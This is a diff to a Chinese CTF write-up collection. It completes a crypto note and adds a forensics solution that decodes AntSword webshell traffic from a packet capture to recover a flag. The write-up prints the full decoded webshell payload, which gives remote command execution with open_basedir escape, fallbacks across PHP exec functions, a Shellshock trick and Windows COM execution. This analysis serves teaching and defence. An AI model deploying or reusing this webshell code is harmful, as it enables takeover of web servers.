@@ -2552,11 +2552,21 @@ pass：1184485120
 
 把 pass 作为解压密码解压 zip 可以得到 flag.txt，其中内容如下：
 
+```
 VQsCVg0EBAEODQIKAVYHUVIABg4FBgoDDVIFBQEPBgA=
+```
 
-这里的 key 不知道怎么和密文结合起来
+然后把 key 转 bytes 可以得到一个`xkey`
 
-![](imgs/image-20251105221149151.png)
+```python
+from Crypto.Util.number import long_to_bytes
+
+data = 2020304249
+print(long_to_bytes(data))
+# b'xkey'
+```
+
+但是不知道怎么用这个 `xkey` 和上面 base64 编码后的密文得到最后的 flag
 
 ## 题目名称 KobeTea
 
@@ -2585,6 +2595,252 @@ VQsCVg0EBAEODQIKAVYHUVIABg4FBgoDDVIFBQEPBgA=
 用上面的密码解压后用vscode打开，选一下分支即可得到flag：`flag{0ne_bo77le_o1ny_n3ed_4_Yu@n}`
 
 ![](imgs/image-20251117194644395.png)
+
+## 题目名称 yijian霜寒十四州（2025 全国大学生信息安全竞赛 新疆赛区）
+
+附件给了一个流量包，打开看一下流量的特征，发现是蚁剑流量
+
+ 根据响应的格式，很容易知道这个马用的是 ROT13 的编码器
+
+我们追踪 HTTP 流到 HTTP 流84
+
+![](imgs/image-20251209153622659.png)
+
+CyberChef 解码一下可以得到
+
+```
+This trip left some content that uses the same encoder as the Trojan horse,BUDBCYAwEJso0OZyzTyVen7cQNz9qHc/33SGdd1QyqhVC2QQU8dJnRg7/wY=
+```
+
+![](imgs/image-20251209153917898.png)
+
+提示了我们用的是和木马一样的编码器，因此我们回头去找那个木马
+
+![](imgs/image-20251209154112128.png)
+
+![](imgs/image-20251209154149818.png)
+
+发现这个木马的编码器是先 base64 解码然后 inflate 解压了
+
+因此我们直接用这个脚本解一下之前得到的 base64 即可得到 flag
+
+`flag{175374be-4547-f6f6-2232-14d7524d30a5}`
+
+```php
+<?php
+$data = "BUDBCYAwEJso0OZyzTyVen7cQNz9qHc/33SGdd1QyqhVC2QQU8dJnRg7/wY=";
+echo @gzinflate(base64_decode($data));
+//flag{175374be-4547-f6f6-2232-14d7524d30a5}
+?>
+```
+
+当然也可以直接用 CyberChef 解码
+
+![](imgs/image-20251209155304085.png)
+
+这道题到这里其实也就结束了，但是我这里还是理一下这个马的完整逻辑吧
+
+首先就是攻击者在 HTTP 流 43 中上传了一个木马
+
+![](imgs/image-20251209155018283.png)
+
+![](imgs/image-20251209154904164.png)
+
+我们可以看到这个马的参数是从 hope 变量中获取的，然后解 base64 以及 inflate 解压
+
+因此我们来看一下后续请求中 hope 变量中的值，这里就拿 HTTP 流 84 为例
+
+![](imgs/image-20251209155134019.png)
+
+![](imgs/image-20251209155219257.png)
+
+稍微处理一下就可以得到 hope 变量中的值
+
+```
+c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD/APDomON6gwNk40t0yzTLUwSk4yjdXU1LQGAA==
+```
+
+按照之前木马的逻辑，我们解码一下 hope 变量
+
+![](imgs/image-20251209155555772.png)
+
+可以看到这里又套了一层，参数需要去 `_0x33a79f9e82cb5` 变量中获取
+
+因此我们提取并解码一下
+
+![](imgs/image-20251209155702789.png)
+
+```php
+<?php
+@ini_set("display_errors", "0");
+@set_time_limit(0);
+$opdir = @ini_get("open_basedir");
+if ($opdir) {
+    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
+    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
+    @array_push($oparr, $ocwd, sys_get_temp_dir());
+    foreach ($oparr as $item) {
+        if (!@is_writable($item)) {
+            continue;
+        };
+        $tmdir = $item . "/.9315a2db7e5d";
+        @mkdir($tmdir);
+        if (!@file_exists($tmdir)) {
+            continue;
+        }
+        $tmdir = realpath($tmdir);
+        @chdir($tmdir);
+        @ini_set("open_basedir", "..");
+        $cntarr = @preg_split("/\\\\|\//", $tmdir);
+        for ($i = 0; $i < sizeof($cntarr); $i++) {
+            @chdir("..");
+        };
+        @ini_set("open_basedir", "/");
+        @rmdir($tmdir);
+        break;
+    };
+};;
+function asenc($out)
+{
+    return str_rot13($out);
+};
+function asoutput()
+{
+    $output = ob_get_contents();
+    ob_end_clean();
+    echo "80" . "324";
+    echo @asenc($output);
+    echo "5a9" . "ae81";
+}
+
+ob_start();
+try {
+    $p = base64_decode(substr($_POST["nd940e9a247057"], 2));
+    $s = base64_decode(substr($_POST["ca662241d33bb8"], 2));
+    $envstr = @base64_decode(substr($_POST["uf4fe7e98c2272"], 2));
+    $d = dirname($_SERVER["SCRIPT_FILENAME"]);
+    $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
+    if (substr($d, 0, 1) == "/") {
+        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
+    } else {
+        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
+    }
+    if (!empty($envstr)) {
+        $envarr = explode("|||asline|||", $envstr);
+        foreach ($envarr as $v) {
+            if (!empty($v)) {
+                @putenv(str_replace("|||askey|||", "=", $v));
+            }
+        }
+    }
+    $r = "{$p} {$c}";
+    function fe($f)
+    {
+        $d = explode(",", @ini_get("disable_functions"));
+        if (empty($d)) {
+            $d = array();
+        } else {
+            $d = array_map('trim', array_map('strtolower', $d));
+        }
+        return (function_exists($f) && is_callable($f) && !in_array($f, $d));
+    };
+    function runshellshock($d, $c)
+    {
+        if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
+            if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
+                $tmp = tempnam(sys_get_temp_dir(), 'as');
+                putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
+                if (fe('error_log')) {
+                    error_log("a", 1);
+                } else {
+                    mail("a@127.0.0.1", "", "", "-bv");
+                }
+            } else {
+                return False;
+            }
+            $output = @file_get_contents($tmp);
+            @unlink($tmp);
+            if ($output != "") {
+                print($output);
+                return True;
+            }
+        }
+        return False;
+    };
+    function runcmd($c)
+    {
+        $ret = 0;
+        $d = dirname($_SERVER["SCRIPT_FILENAME"]);
+        if (fe('system')) {
+            @system($c, $ret);
+        } elseif (fe('passthru')) {
+            @passthru($c, $ret);
+        } elseif (fe('shell_exec')) {
+            print(@shell_exec($c));
+        } elseif (fe('exec')) {
+            @exec($c, $o, $ret);
+            print(join("
+", $o));
+        } elseif (fe('popen')) {
+            $fp = @popen($c, 'r');
+            while (!@feof($fp)) {
+                print(@fgets($fp, 2048));
+            }
+            @pclose($fp);
+        } elseif (fe('proc_open')) {
+            $p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
+            while (!@feof($io[1])) {
+                print(@fgets($io[1], 2048));
+            }
+            while (!@feof($io[2])) {
+                print(@fgets($io[2], 2048));
+            }
+            @fclose($io[1]);
+            @fclose($io[2]);
+            @proc_close($p);
+        } elseif (fe('antsystem')) {
+            @antsystem($c);
+        } elseif (runshellshock($d, $c)) {
+            return $ret;
+        } elseif (substr($d, 0, 1) != "/" && @class_exists("COM")) {
+            $w = new COM('WScript.shell');
+            $e = $w->exec($c);
+            $so = $e->StdOut();
+            $ret .= $so->ReadAll();
+            $se = $e->StdErr();
+            $ret .= $se->ReadAll();
+            print($ret);
+        } else {
+            $ret = 127;
+        }
+        return $ret;
+    };
+    $ret = @runcmd($r . " 2>&1");
+    print ($ret != 0) ? "ret={$ret}" : "";;
+} catch (Exception $e) {
+    echo "ERROR://" . $e->getMessage();
+};
+asoutput();
+die();
+?>
+```
+
+解码后我们就可以得到这个木马的主体了
+
+分析上面的代码我们可以得到，执行的命令是由 `ca662241d33bb8` 变量传入的
+
+就是前面会有两字节的干扰数据，需要我们删除后再解码
+
+![](imgs/image-20251209160159904.png)
+
+解码响应的流程也是一样，删除上面代码中的干扰字符后 ROT13 解码即可
+
+![](imgs/image-20251209160646552.png)
+
+如果想要更干净的响应，也可以把上面执行命令中的干扰字符也删除
+
+
+
 
 
 ---
